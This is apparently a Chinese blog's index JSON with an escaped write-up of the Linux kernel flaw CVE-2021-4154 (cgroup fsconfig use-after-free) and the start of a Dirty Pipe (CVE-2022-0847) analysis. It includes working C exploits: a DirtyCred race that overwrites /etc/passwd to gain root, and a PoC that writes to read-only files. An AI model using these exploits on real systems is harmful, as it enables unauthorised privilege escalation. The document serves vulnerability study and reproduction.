file会被释放，产生UAF\n```\n\n漏洞点在fsconfig系统调用处理过程中，它将\"文件描述符fd_null对应的file结构\"当成了一个\"存储字符串的堆块指针\"，即混淆了如下结构体中`fs_parameter->file` 和 `fs_parameter->string` ，\n\n```c\n/*\n * Configuration parameter.\n */\nstruct fs_parameter {\n\tconst char\t\t*key;\t\t/* Parameter name */\n\tenum fs_value_type\ttype:8;\t\t/* The type of value here */\n\tunion {\n\t\tchar\t\t*string;\n\t\tvoid\t\t*blob;\n\t\tstruct filename\t*name;\n\t\tstruct file\t*file;\n\t};\n\tsize_t\tsize;\n\tint\tdirfd;\n};\n```\n\n于是将一个file结构指针赋值给了`fc->source`。当调用`close(fscontext_fd)`时释放`fc->source`（即fd_null对应的file结构），但此时fd_null仍然还在使用当中，于是出现了UAF。\n\n跟踪一下UAF的形成过程：\n\n1. 先看一下给`fc->source`赋值的操作，跟踪fsconfig的调用路径\n\n   ```c\n   SYSCALL_DEFINE5(fsconfig, int, fd, unsigned int, cmd, const char __user *, _key, const void __user *, _value, int, aux)\n       /*\n       \tif (_key) {\n   \t\t\tparam.key = strndup_user(_key, 256);\n   \t\t}\n   \t\t......\n       \tcase FSCONFIG_SET_FD:\n   \t\t\tparam.type = fs_value_is_file;\n   \t\t\tret = -EBADF;\n   \t\t\tparam.file = fget(aux);\t// fget()：通过文件描述符查找并返回file结构体,并且给file->f_count引用数加1\n   \t\t\t\t\t\t\t\t\t// fput(): 与fget()对应，对f_count进行-1，如果发现f_count为0了，那么将其对应的struct file结构删除\n   \t\t\tif (!param.file)\n   \t\t\t\tgoto out_key;\n   \t\t\tbreak;\n       */\n   \n   vfs_fsconfig_locked(fc, cmd, &param);\n   \n   vfs_parse_fs_param(fc, param);\n   \n   fc->ops->parse_param(fc, param);\t\n   \n   cgroup1_parse_param(struct fs_context *fc, struct fs_parameter *param)\n   \t/*\n   \t\tif (strcmp(param->key, \"source\") == 0) {\n   \t\t\tfc->source = param->string;\t\t// union：param->string即param->file\n   \t\t\tparam->string = NULL;\n   \t\t\treturn 0;\n   \t\t}\n   \t*/\n   ```\n\n2. 再看一下释放点，用户态执行`close(fscontext_fd)`后，内核调用路径如下\n\n   ```c\n   fscontext_release()\n   \n   put_fs_context()\n   /*\n   \tput_filesystem(fc->fs_type);\n   \tkfree(fc->source);\t\t\t\t// 此处释放后，导致fd_null对应得file结构体UAF\n   \tkfree(fc);\n   */\n   ```\n\n   \n\n从代码逻辑来说：\n\n​\t\tcgroup v1的fs parser对于key为\"source\"的情况，默认aux应当指向一个字符串。然而，实际代码实现中，在指定key为\"source\"的情况下，指定aux指向一个文件描述符也是可以进入`cgroup1_parse_param()`分支的。所以，默认\"source\"对应的type总是fs_value_is_string导致了漏洞的产生，因为type也可能是fs_value_is_file。\n\n\n\n从fs_parameter结构体角度来说：\n\n​\t\t使用fs_parameter结构体中union结构时，按理说应当根据param->type的值来解析此时对应union的哪一个成员。但是`cgroup1_parse_param()`的参数解析流程并未检查param->type，理所当然解析为param->string，并赋值给fc->source（导致file结构体指针给到了fc->source）。\n\n\n\n# poc\n\npoc中使用到了`fsopen()`和`fsconfig()`两个函数，先了解一下：\n\n```c\n/*\n\tsys_fsopen - Open a filesystem by name so that it can be configured for mounting.\n*/\nasmlinkage long sys_fsopen(const char __user *fs_name, unsigned int flags);\n\n/*\n\tsys_fsconfig - Set parameters and trigger actions on a context\n\t@cmd - fsconfig_set_fd: An open file descriptor is specified.  @_value must be NULL and @aux indicates the file descriptor.\n*/\nasmlinkage long sys_fsconfig(int fs_fd, unsigned int cmd, const char __user *key,\n\t\t\t     const void __user *value, int aux);\n```\n\npoc代码如下，编译执行后，在dmesg中能看到UAF的打印（前提是内核开启了KASAN，不然无法捕捉到）。\n\n```c\n// gcc test.c -o test\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <stdarg.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <string.h>\n#include <ctype.h>\n#include <pthread.h>\n#include <sys/mman.h>\n#include <sys/syscall.h>\n\nstatic void die(const char *fmt, ...) {\n  va_list params;\n  va_start(params, fmt);\n  vfprintf(stderr, fmt, params);\n  va_end(params);\n  exit(1);\n}\n\nvoid init_namespace(void) {\n    int fd;\n    char buff[0x100];\n\n    uid_t uid = getuid();\n    gid_t gid = getgid();\n\n    if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) {\n        die(\"unshare(CLONE_NEWUSER | CLONE_NEWNS): %m\");\n    }\n\n    if (unshare(CLONE_NEWNET)) {\n        die(\"unshare(CLONE_NEWNET): %m\");\n    }\n\n    fd = open(\"/proc/self/setgroups\", O_WRONLY);\n    snprintf(buff, sizeof(buff), \"deny\");\n    write(fd, buff, strlen(buff));\n    close(fd);\n\n    fd = open(\"/proc/self/uid_map\", O_WRONLY);\n    snprintf(buff, sizeof(buff), \"0 %d 1\", uid);\n    write(fd, buff, strlen(buff));\n    close(fd);\n\n    fd = open(\"/proc/self/gid_map\", O_WRONLY);\n    snprintf(buff, sizeof(buff), \"0 %d 1\", gid);\n    write(fd, buff, strlen(buff));\n    close(fd);\n}\n\n\nint main(){\n\tinit_namespace();\n\tint fd_fscontext = syscall(__NR_fsopen, \"cgroup\", 0);\n\tif (fd_fscontext < 0) {\n\t\tperror(\"fsopen\");\n\t\tdie(\"\");\n\t}\n\tint fd_null = open(\"/dev/null\", O_RDONLY);\n\tsyscall(__NR_fsconfig, fd_fscontext, 5, \"source\", 0, fd_null);\n\tclose(fd_fscontext);\n\tclose(fd_null);\n\t//close_range(3, ~0U, 0);\n}\n```\n\ndmesg中打印的信息如下：\n\n```\n[ 1785.655850] ==================================================================\n[ 1785.658925] BUG: KASAN: use-after-free in filp_close+0x26/0xb0\n[ 1785.661875] Read of size 8 at addr ffff8883cd692c78 by task test/2163\n\n[ 1785.667787] CPU: 6 PID: 2163 Comm: test Tainted: G             L    5.4.0 #2\n[ 1785.667790] Hardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop Reference Platform, BIOS 6.00 11/12/2020\n[ 1785.667793] Call Trace:\n[ 1785.667808]  dump_stack+0x96/0xca\n[ 1785.667818]  print_address_description.constprop.0+0x20/0x210\n[ 1785.667824]  ? filp_close+0x26/0xb0\n[ 1785.667828]  __kasan_report.cold+0x1b/0x41\n[ 1785.667832]  ? filp_close+0x26/0xb0\n[ 1785.667836]  kasan_report+0x12/0x20\n[ 1785.667841]  check_memory_region+0x129/0x1b0\n[ 1785.667845]  __kasan_check_read+0x11/0x20\n[ 1785.667848]  filp_close+0x26/0xb0\n[ 1785.667854]  __close_fd+0x11d/0x150\n[ 1785.667858]  __x64_sys_close+0x40/0x80\n[ 1785.667865]  do_syscall_64+0x72/0x210\n[ 1785.667870]  entry_SYSCALL_64_after_hwframe+0x44/0xa9\n[ 1785.667876] RIP: 0033:0x7fe01ac4a817\n[ 1785.667883] Code: ff ff e8 7c 12 02 00 66 2e 0f 1f 84 00 00 00 00 00 66 90 f3 0f 1e fa 64 8b 04 25 18 00 00 00 85 c0 75 10 b8 03 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 41 c3 48 83 ec 18 89 7c 24 0c e8 b3 5d f8 ff\n[ 1785.667885] RSP: 002b:00007ffeba9710a8 EFLAGS: 00000246 ORIG_RAX: 0000000000000003\n[ 1785.667891] RAX: ffffffffffffffda RBX: 000055e759df2640 RCX: 00007fe01ac4a817\n[ 1785.667893] RDX: 000055e759df311a RSI: 0000000000000005 RDI: 0000000000000004\n[ 1785.667895] RBP: 00007ffeba9710c0 R08: 0000000000000004 R09: 00007ffeba9711b0\n[ 1785.667897] R10: 0000000000000000 R11: 0000000000000246 R12: 000055e759df21e0\n[ 1785.667900] R13: 00007ffeba9711b0 R14: 0000000000000000 R15: 0000000000000000\n\n[ 1785.670155] Allocated by task 2163:\n[ 1785.672385]  save_stack+0x23/0x90\n[ 1785.672389]  __kasan_kmalloc.constprop.0+0xcf/0xe0\n[ 1785.672393]  kasan_slab_alloc+0xe/0x10\n[ 1785.672396]  kmem_cache_alloc+0xce/0x240\n[ 1785.672400]  __alloc_file+0x2b/0x1c0\n[ 1785.672402]  alloc_empty_file+0x46/0xc0\n[ 1785.672407]  path_openat+0xd1/0x22f0\n[ 1785.672410]  do_filp_open+0x12b/0x1c0\n[ 1785.672413]  do_sys_open+0x1fb/0x2f0\n[ 1785.672417]  __x64_sys_openat+0x59/0x70\n[ 1785.672421]  do_syscall_64+0x72/0x210\n[ 1785.672425]  entry_SYSCALL_64_after_hwframe+0x44/0xa9\n\n[ 1785.674579] Freed by task 2163:\n[ 1785.676657]  save_stack+0x23/0x90\n[ 1785.676661]  __kasan_slab_free+0x137/0x180\n[ 1785.676664]  kasan_slab_free+0xe/0x10\n[ 1785.676667]  kfree+0x98/0x260\n[ 1785.676671]  put_fs_context+0x16f/0x210\n[ 1785.676674]  fscontext_release+0x35/0x40\n[ 1785.676678]  __fput+0x16e/0x3a0\n[ 1785.676680]  ____fput+0xe/0x10\n[ 1785.676686]  task_work_run+0xc0/0xe0\n[ 1785.676690]  exit_to_usermode_loop+0x187/0x1c0\n[ 1785.676693]  do_syscall_64+0x1e0/0x210\n[ 1785.676697]  entry_SYSCALL_64_after_hwframe+0x44/0xa9\n\n[ 1785.678642] The buggy address belongs to the object at ffff8883cd692c40\n                which belongs to the cache filp(1119:session-1.scope) of size 256\n[ 1785.683211] The buggy address is located 56 bytes inside of\n                256-byte region [ffff8883cd692c40, ffff8883cd692d40)\n[ 1785.687552] The buggy address belongs to the page:\n[ 1785.689679] page:ffffea000f35a400 refcount:1 mapcount:0 mapping:ffff8883cfa661c0 index:0xffff8883cd6952c0 compound_mapcount: 0\n[ 1785.689687] raw: 0017ffffc0010200 ffffea000cd81008 ffff8883d45ace50 ffff8883cfa661c0\n[ 1785.689692] raw: ffff8883cd6952c0 00000000002e001f 00000001ffffffff 0000000000000000\n[ 1785.689694] page dumped because: kasan: bad access detected\n\n[ 1785.691712] Memory state around the buggy address:\n[ 1785.693790]  ffff8883cd692b00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n[ 1785.695944]  ffff8883cd692b80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n[ 1785.698214] >ffff8883cd692c00: fc fc fc fc fc fc fc fc fb fb fb fb fb fb fb fb\n[ 1785.699548]                                                                 ^\n[ 1785.701820]  ffff8883cd692c80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n[ 1785.703994]  ffff8883cd692d00: fb fb fb fb fb fb fb fb fc fc fc fc fc fc fc fc\n[ 1785.706162] ==================================================================\n[ 1785.708370] Disabling lock debugging due to kernel taint\n\n```\n\n\n\n# 利用方法 - dirtycred\n\n利用的逻辑用几张图来描述：\n\n1. 首先是UAF如何产生的\n\n   ![image-20230518220859656](image-20230518220859656.png?size=600)\n\n2. 然后，在理想条件下的利用思路\n\n   根据dirtycred利用思路，在对文件检查和实际写入的窗口间隙，将file结构体替换成不具备写权限的特权文件。\n\n   ![image-20230518222645219](image-20230518222645219.png?size=600)\n\n   但是\"check\"和\"write\"的时间窗口实在太小了，很难构成利用。\n\n3. 最后，延长TOC-TOU时间窗口的利用思路\n\n   ![image-20230518225350906](image-20230518225350906.png?size=600)\n\n\n\n在原作者的exp基础上做了些更改，写了一版更简洁易读的利用代码。主要有以下几点区别：\n\n- 使用封装好的创建命名空间的函数\n- 使用更常用的write函数，而不是writev\n- 将写入数据缩小为1G，缩短exp执行时间，这个窗口完全足够利用\n\n```c\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <stdarg.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <string.h>\n#include <ctype.h>\n#include <pthread.h>\n#include <assert.h>\n#include <sys/mman.h>\n#include <sys/syscall.h>\n#include <sys/uio.h>\n#include <sys/stat.h>\n#include <linux/kcmp.h>\n\n#ifndef __NR_fsconfig\n#define __NR_fsconfig 431\n#endif\n#ifndef __NR_fsopen\n#define __NR_fsopen 430\n#endif\n\n#define NR_PAGE 0x40000\n#define MAX_FILE_NUM 1000\nint uaf_fd;\nint fds[MAX_FILE_NUM];\n\nint run_write = 0;\nint run_spray = 0;\n\n\nstatic void die(const char *fmt, ...) {\n  va_list params;\n\n  va_start(params, fmt);\n  vfprintf(stderr, fmt, params);\n  va_end(params);\n  exit(1);\n}\n\n\nvoid init_namespace(void) {\n    int fd;\n    char buff[0x100];\n\n    uid_t uid = getuid();\n    gid_t gid = getgid();\n\n    if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) {\n        die(\"unshare(CLONE_NEWUSER | CLONE_NEWNS): %m \\n\");\n    }\n\n    if (unshare(CLONE_NEWNET)) {\n        die(\"unshare(CLONE_NEWNET): %m \\n\");\n    }\n\n    fd = open(\"/proc/self/setgroups\", O_WRONLY);\n    snprintf(buff, sizeof(buff), \"deny\");\n    write(fd, buff, strlen(buff));\n    close(fd);\n\n    fd = open(\"/proc/self/uid_map\", O_WRONLY);\n    snprintf(buff, sizeof(buff), \"0 %d 1\", uid);\n    write(fd, buff, strlen(buff));\n    close(fd);\n\n    fd = open(\"/proc/self/gid_map\", O_WRONLY);\n    snprintf(buff, sizeof(buff), \"0 %d 1\", gid);\n    write(fd, buff, strlen(buff));\n    close(fd);\n}\n\nstatic void use_temporary_dir(void) {\n  system(\"rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data\");\n  char *tmpdir = \"exp_dir\";\n  if (!tmpdir)\n    exit(1);\n  if (chmod(tmpdir, 0777))\n    exit(1);\n  if (chdir(tmpdir))\n    exit(1);\n}\n\nvoid trigger() {\n  int fs_fd = syscall(__NR_fsopen, \"cgroup\", 0);\n  if (fs_fd < 0) {\n    perror(\"fsopen\");\n    die(\"\");\n  }\n\n  symlink(\"./data\", \"./uaf\");         // 为data文件创建一个软链接，避免打开的文件file->f_mode被加上FMODE_ATOMIC_POS标志\n\n  uaf_fd = open(\"./uaf\", 1);\n  if (uaf_fd < 0) {\n    die(\"failed to open symbolic file\\n\");\n  }\n\n  if (syscall(__NR_fsconfig, fs_fd, 5, \"source\", 0, uaf_fd)) {\n    perror(\"fsconfig\");\n    exit(-1);\n  }\n  \n  close(fs_fd);       \t\t// 释放uaf_fd对应的stuct file堆块\n}\n\nvoid *slow_write() {\n  printf(\"[*] start slow write to get the lock\\n\");\n  int fd = open(\"./uaf\", 1);\n\n  if (fd < 0) {\n    perror(\"error open uaf file\");\n    exit(-1);\n  }\n\n  unsigned long int addr = 0x30000000;\n  int offset;\n    // 利用mmap构造一大段\"\\x00\"数据\n  for (offset = 0; offset < NR_PAGE; offset++) {\n    void *r = mmap((void *)(addr + offset * 0x1000), 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);\n    if (r < 0) {\n      printf(\"allocate failed at 0x%x\\n\", offset);\n    }\n  }\n  assert(offset > 0);\n\n  uint64_t wr_len = (NR_PAGE-1)*0x1000;\n  run_write = 1;\n  if (write(fd, (void *)addr, wr_len) < 0) {\t\t\t// 构造了1G大小的空间，写入磁盘文件，延长TOC-TOU时间窗口\n    perror(\"slow write\");\n  }\n\n  printf(\"[*] write done!\\n\");\n  close(fd);      \n}\n\nvoid *write_cmd() {\n  char data[1024] = \"bling:x:0:0:root:/home/bling:/bin/bash\\nroot:x:0:0:root:/root:/bin/bash\\n\";\n\n  while (!run_write) {}\n\n  run_spray = 1;\n  if(write(uaf_fd, data, strlen(data)) < 0){\t\t\t// 由于slow_write()正在写磁盘文件，此处在write check后会阻塞，空出来时间窗口给spray_files()\n    printf(\"failed to write\\n\");\n  }\n\n  printf(\"[*] overwrite done! It should be after the slow write\\n\");\n}\n\nvoid spray_files() {\n  int found = 0;\n\n  while (!run_spray) {}\n  \n  printf(\"[*] got uaf fd %d, start spray....\\n\", uaf_fd);\n  for (int i = 0; i < MAX_FILE_NUM; i++) {\n    fds[i] = open(\"/etc/passwd\", O_RDONLY);\t\t\t// 使用\"/etc/passwd\"文件的struct file占用UAF的file堆块\n    if (fds[i] < 0) {\n      perror(\"open file\");\n      printf(\"%d\\n\", i);\n    }\n    // 比较uaf_fd和fds[i]是否指向同一个文件描述符，相同的话返回0\n    if (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, fds[i]) == 0) {\n      found = 1;\n      printf(\"[!] found, file id %d\\n\", i);\n      for (int j = 0; j < i; j++)\n        close(fds[j]);\n      break;\n    }\n  }\n\n  if(found == 0){\n    printf(\"spary failed, try again!\\n\");\n  }\n}\n\nint main(){\n    pthread_t p_id, p_id_cmd;\n\n    use_temporary_dir();\t\t// 新建一个目录，用来放利用所需的文件\n    init_namespace();\t\t\t// 新建一个命名空间\n    trigger();\t\t\t\t\t// 触发UAF中的free\n\n    pthread_create(&p_id, NULL, slow_write, NULL);\t\t\t// 拉长时间窗口\n    usleep(1);\n    pthread_create(&p_id_cmd, NULL, write_cmd, NULL);\t\t// UAF中的use，往已释放struct file的fd中写\n\n    spray_files();\t\t\t// 堆喷，用高权限struct file占领UAF的file堆块\n\n    pthread_exit(NULL);\n    return 0;\n \n}\n```\n\n使用[ubuntu server 20.04 ](http://old-releases.ubuntu.com/releases/20.04/ubuntu-20.04-live-server-amd64.iso)搭建虚拟机环境，成功改写`/etc/passwd`文件提权：\n\n![image-20230518203532228](image-20230518203532228.png?size=600)\n\n\n\n# 利用方法 - cross-cache\n\ntodo...\n\n这个解法不禁让我想起了前阵子D3ctf没做出来的kcache那道题.... cross cache + msgmsg + pipe buffer.... 先放一放，缓缓\n\n\n\n# 我问我答\n\n## write(v)时，\"check\"和\"write\"在哪儿？\n\n> \"check\"点是指校验文件本身权限的位置，即`file->f_mode`是否有写标志。\"write\"点是指真正执行写操作的位置。\n>\n> 前者write和writev不在一个函数中，后者都在文件系统对应的写函数中。\n\nread/write/readv/writev系统调用对应内核处理函数入口\n\n```\nwritev -> do_writev\nreadv -> do_readv \nwrite -> ksys_write\nread -> ksys_read\nopen -> do_sys_open \n```\n\n以linux 5.4.0为例，跟踪一下writev和write两个系统调用处理过程中的\"check\"点和\"write\"点。\n\n\"check\"位置：\n\n```c\n/* \n\t用户态调用writev()，内核对应处理流程如下，检查权限（check）的操作在do_iter_write()函数中：\n\twritev -> do_writev -> vfs_writev -> do_iter_write -> do_iter_readv_writev -> call_write_iter -> file->f_op->write_iter\n*/\nstatic ssize_t do_iter_write(struct file *file, struct iov_iter *iter,\n\t\tloff_t *pos, rwf_t flags)\n{\n\t// ......\n    if (!(file->f_mode & FMODE_WRITE))\t\t\t\t// check\n\t\treturn -EBADF;\n\tif (!(file->f_mode & FMODE_CAN_WRITE))\t\t\t// check\n\t\treturn -EINVAL;\n    \n\tif (file->f_op->write_iter)\n\t\tret = do_iter_readv_writev(file, iter, pos, WRITE, flags);\n\t// ......\n\treturn ret;\n}\n\n\n/*\n\t用户态调用write()，内核对应处理流程如下，检查权限（check）的操作在vfs_write()函数中：\n\twrite -> ksys_write -> vfs_write -> new_sync_write -> call_write_iter -> file->f_op->write_iter\n*/\nssize_t vfs_write(struct file *file, const char __user *buf, size_t count, loff_t *pos)\n{\n    // ......\n\tif (!(file->f_mode & FMODE_WRITE))\t\t\t\t// check\n\t\treturn -EBADF;\n\tif (!(file->f_mode & FMODE_CAN_WRITE))\t\t\t// check\n\t\treturn -EINVAL;\n\t// ......\n\telse if (file->f_op->write_iter)\n\t\tret = new_sync_write(file, buf, count, pos);\n\t// ......\n\treturn ret;\n}\n\n```\n\n\"write\"位置：\n\n```c\n/*\n\t针对磁盘文件，file->f_op上注册的是ext4_file_operations：\n\t.rodata:FFFFFFFF82082840                 public ext4_file_operations\n\t.rodata:FFFFFFFF82082840 ext4_file_operations dq 0               ; DATA XREF: __ext4_iget+B32↑o\n\t.rodata:FFFFFFFF82082840                                         ; ext4_create+E1↑o ...\n\t.rodata:FFFFFFFF82082848                 dq offset ext4_llseek\n\t.rodata:FFFFFFFF82082850                 dq 0\n\t.rodata:FFFFFFFF82082858                 dq 0\n\t.rodata:FFFFFFFF82082860                 dq offset ext4_file_read_iter\n\t.rodata:FFFFFFFF82082868                 dq offset ext4_file_write_iter\n\n\tfile->f_op->write_iter -> ext4_file_write_iter -> ext4_buffered_write_iter\n*/\nstatic ssize_t ext4_buffered_write_iter(struct kiocb *iocb,\n\t\t\t\t\tstruct iov_iter *from)\n{\n\t// ......\n\tinode_lock(inode);\t\t// 文件系统不允许多个线程同时写入同一个文件，通过锁机制来保证某一时刻只有一个线程在写，这里便是写文件相关的锁\n\t// ......\n\tret = generic_perform_write(iocb->ki_filp, from, iocb->ki_pos);\t\t\t// write\n\t// ......\nout:\n\tinode_unlock(inode);\n\t// ......\n\treturn ret;\n}\n```\n\n所以利用中，一个进程通过大文件写延迟`inode_unlock(inode);`的执行时间，另一个进程便会停在`inode_lock(inode);`获取锁的位置。于是构造了`\"check\" -> 暂停 -> \"write\"`的效果，这两个进程的搭配下，大文件的大小可以决定TOC-TOU的时间窗口长度。\n\n## 为什么选writev而不是write？\n\n> write也可以\n\nJann Horn 的 [double-put exploit](https://bugs.chromium.org/p/project-zero/issues/detail?id=808)的场景下，需要使用writev，因为它利用内核读iovec结构时，让内核线程暂停执行。\n\n而本漏洞利用中，让内核线程暂停的点在`ext4_file_write_iter()`函数中，对writev和write来说是一样的，两者都会走到该分支。\n\n因为无所谓用writev还是write，所以我的exp中就选择了更熟悉的write函数。\n\n\n\n## 为什么需要创建一个软链接来写入？\n\n> 为了绕过__fdget_pos()函数中的锁\n\n无论调用`write()`还是`writev()`写文件时，都会进入`fdget_pos()`函数。这个函数中会根据文件模式（`file->f_mode`），决定是否获取锁（`file->f_pos_lock`）。当`file->f_mode`中包含`FMODE_ATOMIC_POS`时，就会获取`file->f_pos_lock`这个锁，防止其他线程进入。\n\n```c\nstatic inline struct fd fdget_pos(int fd)\n{\n\treturn __to_fd(__fdget_pos(fd));\n}\n\nunsigned long __fdget_pos(unsigned int fd)\n{\n\tunsigned long v = __fdget(fd);\n\tstruct file *file = (struct file *)(v & ~3);\n\n\tif (file && (file->f_mode & FMODE_ATOMIC_POS)) {\n\t\tif (file_count(file) > 1) {\n\t\t\tv |= FDPUT_POS_UNLOCK;\n\t\t\tmutex_lock(&file->f_pos_lock);\n\t\t}\n\t}\n\treturn v;\n}\n\n/* File needs atomic accesses to f_pos */\n#define FMODE_ATOMIC_POS\t((__force fmode_t)0x8000)\n```\n\n然而此时还未进行写文件权限校验，对于我们的利用来说需要一个权限校验后的锁，`fdget_pos()`函数的锁导致我们无法增加TOC-TOU的时间窗口，所以需要想办法绕过这个锁。\n\n`FMODE_ATOMIC_POS`是从哪里来的呢？当我们`open()`一个文件时，会进入如下函数分支。当文件inode是一个常规文件或者目录时，文件的`f_mode`就会被添加`FMODE_ATOMIC_POS`标志。\n\n```c\nstatic int do_dentry_open(struct file *f,\n\t\t\t  struct inode *inode,\n\t\t\t  int (*open)(struct inode *, struct file *))\n{\n\t// ......\n\t/* POSIX.1-2008/SUSv4 Section XSI 2.9.7 */\n\tif (S_ISREG(inode->i_mode) || S_ISDIR(inode->i_mode))\n\t\tf->f_mode |= FMODE_ATOMIC_POS;\n\t// ......\n}\n\nS_ISLNK(st_mode)\t// 是否是一个链接.\nS_ISREG(st_mode)\t// 是否是一个常规文件.\nS_ISDIR(st_mode)\t// 是否是一个目录\nS_ISCHR(st_mode)\t// 是否是一个字符设备.\nS_ISBLK(st_mode)\t// 是否是一个块设备\nS_ISFIFO(st_mode)\t// 是否是一个FIFO文件.\nS_ISSOCK(st_mode)\t// 是否是一个SOCKET文件 \n```\n\n所以，我们只需要为待写入的文件创建一个软链接，然后打开软链接写入，就可以避免`f_mode`被添加`FMODE_ATOMIC_POS`标志，也就可以绕过`fdget_pos()`函数中获取锁的操作。\n\n# 参考文档 \n\n[CVE-2021-4154 错误释放任意file对象-DirtyCred利用](https://bsauce.github.io/2022/10/17/CVE-2021-4154/)\n\n[Linux文件系统之mount](https://zhuanlan.zhihu.com/p/144893220)\n\n[新一代mount系统调用(1)——接口初探](https://zhuanlan.zhihu.com/p/93592262)\n\n[【C语言】S_ISDIR S_ISREG等常见的几个宏](https://blog.csdn.net/u013554213/article/details/89448694)\n\n[kcmp(2) — Linux manual page](https://man7.org/linux/man-pages/man2/kcmp.2.html)\n\n","categories":["经典内核漏洞复现"]},{"title":"经典内核漏洞复现之 dirtypipe","url":"/2023/05/08/230508-dirtypipe-analysis/","content":"\n\n\n- CVE编号：CVE-2022-0847\n\n- 受影响linux版本：5.8 ~ 5.16.11, 5.15.25 and 5.10.102.\n\n- 漏洞原因：pipe管道相关的sys_splice实现中，对pipe_buffer->flags未初始化，导致原本只能被读取的page cache被写\n- poc效果：普通用户可以越权写任意只读文件（缺陷：[不能持久化](https://tttang.com/archive/1480/#toc_0x05)）\n\n\n\n# 漏洞分析\n\n漏洞涉及的代码量较多，所以我们从poc着手开始分析。\n\n## poc分析\n\n```c\n#define _GNU_SOURCE\n#include <unistd.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/stat.h>\n#include <sys/user.h>\n\n#ifndef PAGE_SIZE\n#define PAGE_SIZE 4096\n#endif\n\n/**\n * Create a pipe where all \"bufs\" on the pipe_inode_info ring have the\n * PIPE_BUF_FLAG_CAN_MERGE flag set.\n */\nstatic void prepare_pipe(int p[2])\n{\n    /*\t创建管道\t*/\n\tif (pipe(p)) abort();\n\n\tconst unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);\n\t// 通过fcntl系统调用的F_GETPIPE_SZ和F_SETPIPE_SZ来查看和设置管道容量\n\tstatic char buffer[4096];\n\n\t/* 填满管道\n\t\t此时每一个管理pipe空间的pipe_buffer结构体中flags会被置PIPE_BUF_FLAG_CAN_MERGE*/\n\tfor (unsigned r = pipe_size; r > 0;) {\n\t\tunsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;\n\t\twrite(p[1], buffer, n);\n\t\tr -= n;\n\t}\n\n\t/* 清空管道\n\t\t此时pipe_buffer->flags仍然有PIPE_BUF_FLAG_CAN_MERGE标志 */\n\tfor (unsigned r = pipe_size; r > 0;) {\n\t\tunsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;\n\t\tread(p[0], buffer, n);\n\t\tr -= n;\n\t}\n\n\t/* 此时管道已经空了，如果有人将某个页面关联到pipe_buffer，\n\t\t并且忘记初始化pipe_buffer->flags的话，这个页面就可能被merge（被写） */\n}\n\nint main(int argc, char **argv)\n{\n\tif (argc != 4) {\n\t\tfprintf(stderr, \"Usage: %s TARGETFILE OFFSET DATA\\n\", argv[0]);\n\t\treturn EXIT_FAILURE;\n\t}\n\n\tconst char *const path = argv[1];\n\tloff_t offset = strtoul(argv[2], NULL, 0);\n\tconst char *const data = argv[3];\n\tconst size_t data_size = strlen(data);\n\n\tif (offset % PAGE_SIZE == 0) {\n\t\tfprintf(stderr, \"Sorry, cannot start writing at a page boundary\\n\");\n\t\treturn EXIT_FAILURE;\n\t}\n\n\tconst loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;\n\tconst loff_t end_offset = offset + (loff_t)data_size;\n\tif (end_offset > next_page) {\n\t\tfprintf(stderr, \"Sorry, cannot write across a page boundary\\n\");\n\t\treturn EXIT_FAILURE;\n\t}\n\n\t/* open the input file and validate the specified offset */\n\tconst int fd = open(path, O_RDONLY); // yes, read-only! :-)\n\tif (fd < 0) {\n\t\tperror(\"open failed\");\n\t\treturn EXIT_FAILURE;\n\t}\n\n\tstruct stat st;\n\tif (fstat(fd, &st)) {\n\t\tperror(\"stat failed\");\n\t\treturn EXIT_FAILURE;\n\t}\n\n\tif (offset > st.st_size) {\n\t\tfprintf(stderr, \"Offset is not inside the file\\n\");\n\t\treturn EXIT_FAILURE;\n\t}\n\n\tif (end_offset > st.st_size) {\n\t\tfprintf(stderr, \"Sorry, cannot enlarge the file\\n\");\n\t\treturn EXIT_FAILURE;\n\t}\n\n\t/* 1. 首先，通过prepqre_pipe()让管道中16个pipe_buffer->flags都被置为 \n\t\t\tPIPE_BUF_FLAG_CAN_MERGE。merge代表“合并”，我理解这个标志的意思是，\n\t\t\t只要当前pipe_buffer对应的page还有空间，那么下一次往管道写的时候，\n\t\t\t就可以继续写到这个page里*/\n\tint p[2];\n\tprepare_pipe(p);\t\n\n\t/* 2. splice将文件page cache关联到管道的pipe_buffer->page，通过管道就能将文件内容读出。\n\t\t\t漏洞就出在这个函数的实现中，由于此时pipe_buffer->flags为PIPE_BUF_FLAG_CAN_MERGE，\n            导致通过写管道，就能写磁盘文件。且整个过程中没有写权限的检查。*/\n\t--offset;\n\tssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);\n\tif (nbytes < 0) {\n\t\tperror(\"splice failed\");\n\t\treturn EXIT_FAILURE;\n\t}\n\tif (nbytes == 0) {\n\t\tfprintf(stderr, \"short splice\\n\");\n\t\treturn EXIT_FAILURE;\n\t}\n\n\t/* 3. 通过write写管道，就直接写到了文件 */\n\tnbytes = write(p[1], data, data_size);\n\tif (nbytes < 0) {\n\t\tperror(\"write failed\");\n\t\treturn EXIT_FAILURE;\n\t}\n\tif ((size_t)nbytes < data_size) {\n\t\tfprintf(stderr, \"short write\\n\");\n\t\treturn EXIT_FAILURE;\n\t}\n\n\tprintf(\"It worked!\\n\");\n\treturn EXIT_SUCCESS;\n}\n```\n\npoc对应到内核处理过程中，三个重点如下：\n\n1. 第一次写pipe时，对应的内核代码如下：\n\n   ```c\n   static ssize_t pipe_write(struct kiocb *iocb, struct iov_iter *from)\n   {\n   // ......\n   \t\t\tbuf = &pipe->bufs[head & 